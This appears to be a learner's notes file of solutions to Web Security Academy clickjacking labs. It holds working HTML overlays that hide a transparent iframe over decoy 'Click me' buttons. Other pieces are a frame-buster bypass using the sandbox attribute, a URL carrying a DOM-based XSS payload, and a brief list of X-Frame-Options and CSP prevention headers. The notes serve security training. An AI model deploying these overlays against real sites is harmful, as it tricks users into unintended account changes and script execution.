# Clickjacking (UI redressing) 

## Lab: Basic clickjacking with CSRF token protection

(Could be) IMPORTANT: Enable third-party for `[*.]web-security-academy.net`, otherwise when you try to login in exploit server you will get `"Invalid CSRF token (session does not contain a CSRF token)"` because the session cookie is blocked.

```html
<style>
    body {
        position: relative;
    }

    iframe {
        width: 500px;
        height: 700px;
        z-index: 2;
        opacity: 0.0000001;
        position: absolute;
    }

    #div {
        z-index: 1;
        position: absolute;
        top: 480px;
        left: 40px;
        width: 100px;
        height: 40px;
    }
</style>
<body>
    <iframe src="https://0a8100b4031463b8879a493300590073.web-security-academy.net/my-account"></iframe>
    <div id="div">click</div>
</body>
```


## Lab: Clickjacking with form input data prefilled from a URL parameter

```html
<style>
   iframe {
   position:relative;
   width:500px;
   height: 700px;
   opacity: 0.0001;
   z-index: 2;
   }
   div {
   position:absolute;
   top:440px;
   left:80px;
   z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://0a3600110396f68980d6fd3500a00079.web-security-academy.net/my-account?email=wiene123r@normal-user.net"></iframe>
```



## Lab: Clickjacking with a frame buster script

```html
<style>
   iframe {
   position:relative;
   width:500px;
   height: 700px;
   opacity: 0.0001;
   z-index: 2;
   }
   div {
   position:absolute;
   top:440px;
   left:80px;
   z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://0a9b00e703c7f4ce8779b32300d800de.web-security-academy.net/my-account?email=wiene123r@normal-user.net" sandbox="allow-forms"></iframe>
```


## Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS

```html
<style>
   iframe {
   position:relative;
   width:500px;
   height: 700px;
   opacity: 0.0001;
   z-index: 2;
   }
   div {
   position:absolute;
   top:440px;
   left:80px;
   z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://0a4c009d046d20528140c05c00ff00da.web-security-academy.net/feedback?name=%3Cimg%20src=1%20onerror=print()%3E&email=fwej@fwejo.com&subject=fweij&message=fweojf"></iframe>
```


## Lab: Multistep clickjacking

Dont know why this does not work.

```html
<style>
    body {
        position: relative;
    }

    #vic {
        width: 500px;
        height: 700px;
        z-index: 2;
        opacity: 0.1;
        position: absolute;
    }

    #div1 {
        z-index: 1;
        position: absolute;
        top: 490px;
        left: 40px;
    }

    #div2 {
        z-index: 1;
        position: absolute;
        top: 285px;
        left: 200px;
    }
</style>
<body>
    <div id="div1">Click me first</div>
    <div id="div2">Click me next</div>
    <iframe id="vic" src="https://0ab6000904f9708a813ac59100830033.web-security-academy.net/my-account"></iframe>
</body>
```


## Prevention

X-Frame-Options and Content Security Policy.

`X-Frame-Options: deny`  
`X-Frame-Options: sameorigin`  
`X-Frame-Options: allow-from https://normal-website.com`

`Content-Security-Policy: frame-ancestors 'self';`  
`Content-Security-Policy: frame-ancestors normal-website.com;`


